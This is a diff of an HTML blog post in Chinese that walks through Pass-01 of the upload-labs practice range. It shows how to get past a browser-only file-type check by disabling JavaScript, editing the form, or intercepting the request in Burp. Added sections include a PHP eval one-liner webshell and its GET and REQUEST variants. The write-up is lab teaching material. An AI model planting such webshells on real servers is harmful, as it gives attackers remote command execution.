@@ -173,7 +173,7 @@ Pass-01源代码：
             
             
                 <span class="category">
-                    <a href="/YUR1kaaaBlog/categories/渗透测试/">渗透测试</a>
+                    <a href="/YUR1kaaaBlog/categories/文件上传漏洞/">文件上传漏洞</a>
                 </span>
             
         </div>
@@ -195,7 +195,7 @@ Pass-01源代码：
 <hr>
 <h4 id="靶场：upload-labs"><a href="#靶场：upload-labs" class="headerlink" title="靶场：upload-labs"></a>靶场：upload-labs</h4><hr>
 <h4 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h4><p>源代码：</p>
-<p><img src="/YUR1kaaaBlog/images/image-20260802215854447.png"></p>
+<p><img src="/YUR1kaaaBlog/images/image-20260802215854447.png" alt="image-20260802215854447"></p>
 <p>查看页面源代码找到上传文件的form表单</p>
 <p>HTML的form表单是用于收集用户输入数据并发送到服务器的容器</p>
 <p>语法：</p>
@@ -216,14 +216,41 @@ Pass-01源代码：
 <p>到此为止发现Pass-01做的是前端校验，完全在浏览器端用 JS 完成，服务端没有做任何文件类型检查。</p>
 <p><strong><code>checkFile()</code></strong> 只在表单 <strong><code>onsubmit</code></strong> 时触发，绕过前端校验后，服务端照单全收。</p>
 <p>绕过方法如下：</p>
-<h4 id="（1）禁用JS渲染"><a href="#（1）禁用JS渲染" class="headerlink" title="（1）禁用JS渲染"></a>（1）禁用JS渲染</h4><p><img src="/YUR1kaaaBlog/images/image-20260802222655504.png"></p>
+<h4 id="（1）禁用JS渲染"><a href="#（1）禁用JS渲染" class="headerlink" title="（1）禁用JS渲染"></a>（1）禁用JS渲染</h4><p><img src="/YUR1kaaaBlog/images/image-20260802222655504.png" alt="image-20260802222655504"></p>
 <p>浏览器 F12 → Settings → 禁用JavaScript，直接上传 webshell</p>
 <h4 id="（2）改前端代码"><a href="#（2）改前端代码" class="headerlink" title="（2）改前端代码"></a>（2）改前端代码</h4><p>ctrl+s 下载源码（静态网站），在编辑器里打开，添加action&#x3D;目标url（因为在原网页中post默认提交给当前页面，即目标url，这里在自己的静态页面下需要指定上传到哪个url）</p>
-<p><img src="/YUR1kaaaBlog/images/image-20260802225642027.png"></p>
+<p><img src="/YUR1kaaaBlog/images/image-20260802225642027.png" alt="image-20260802225642027"></p>
 <p>然后改代码判断逻辑或者改js函数，让输出为true即可</p>
-<p><img src="/YUR1kaaaBlog/images/image-20260802233509188.png"></p>
-<h4 id="（3）bp抓包"><a href="#（3）bp抓包" class="headerlink" title="（3）bp抓包"></a>（3）bp抓包</h4><p>Edge + FoxyProxy 默认不拦截本地地址，无法抓包</p>
-<p>具体过程是直接上传合法格式文件，然后抓包改后缀</p>
+<p><img src="/YUR1kaaaBlog/images/image-20260802233509188.png" alt="image-20260802233509188"></p>
+<h4 id="（3）bp抓包"><a href="#（3）bp抓包" class="headerlink" title="（3）bp抓包"></a>（3）bp抓包</h4><p>Edge浏览器默认放行本地地址请求，怎么配置代理都抓不到</p>
+<p>不换浏览器的解决方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+
+<p>管理员身份编辑文件，在末尾新建一行加入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1    lab.test</span><br></pre></td></tr></table></figure>
+
+<p>（win键管理员身份打开记事本，ctrl+o选取文件，修改保存）</p>
+<p>此后需要代理 127.0.0.1 访问该地址，会识别为外部地址走代理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.test:8080</span><br></pre></td></tr></table></figure>
+
+<p>原 localhost 仍可用</p>
+<p>上传一张正常合法格式图片：</p>
+<p><img src="/YUR1kaaaBlog/images/image-20260803165751240.png" alt="image-20260803165751240"></p>
+<p>修改 <code>filename</code> &#x3D; <code>xxx.php</code></p>
+<p>修改 <code>------WebKitFormBoundarylFh60HsuePsbCW7</code> 之间的二进制图片内容为木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交进入空白页面，提交POST请求，</p>
+<p><img src="/YUR1kaaaBlog/images/image-20260803191838452.png" alt="image-20260803191838452"></p>
+<p>成功连接证明webshell有效</p>
+<p><img src="/YUR1kaaaBlog/images/image-20260803192927372.png" alt="image-20260803192927372"></p>
+<p>或者直接把shell改合法后缀上传，再拦截改php</p>
+<p><img src="/YUR1kaaaBlog/images/image-20260803193209903.png" alt="image-20260803193209903"></p>
+<p><img src="/YUR1kaaaBlog/images/image-20260803193219723.png" alt="image-20260803193219723"></p>
+<hr>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>一句话木马可以写 <strong><code>&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;</code></strong> 或 <strong><code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;]); ?&gt;</code></strong></p>
+<p>然后可以直接在 url 栏里 <strong><code>?cmd=phpinfo();</code></strong> 用Get请求获取信息</p>
+<p>此处<strong>必须加分号</strong>，因为php不像HTML和JavaScript会自动补全分号，而eval()函数更没有自动补全功能，必须写出完整php语句</p>
 
     </div>
 
@@ -232,7 +259,7 @@ Pass-01源代码：
     
         <div class="post-tags">
             <i class="fa fa-tags" aria-hidden="true"></i>
-            <a href="/YUR1kaaaBlog/tags/文件上传漏洞/">#文件上传漏洞</a>
+            <a href="/YUR1kaaaBlog/tags/文件上传漏洞/">#文件上传漏洞</a> <a href="/YUR1kaaaBlog/tags/Pass-01/">#Pass-01</a>
         </div>
     
 
@@ -292,19 +319,19 @@ Pass-01源代码：
     <ul>
         
         <li>
-            <a class="footer-post" href="/YUR1kaaaBlog/categories/Coding/">Coding</a>
-        </li>
-        
-        <li>
             <a class="footer-post" href="/YUR1kaaaBlog/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/YUR1kaaaBlog/categories/Bugku-CTF/">Bugku CTF</a>
+            <a class="footer-post" href="/YUR1kaaaBlog/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a>
         </li>
         
         <li>
-            <a class="footer-post" href="/YUR1kaaaBlog/categories/tools/">tools</a>
+            <a class="footer-post" href="/YUR1kaaaBlog/categories/Coding/">Coding</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/YUR1kaaaBlog/categories/Bugku-CTF/">Bugku CTF</a>
         </li>
         
     </ul>
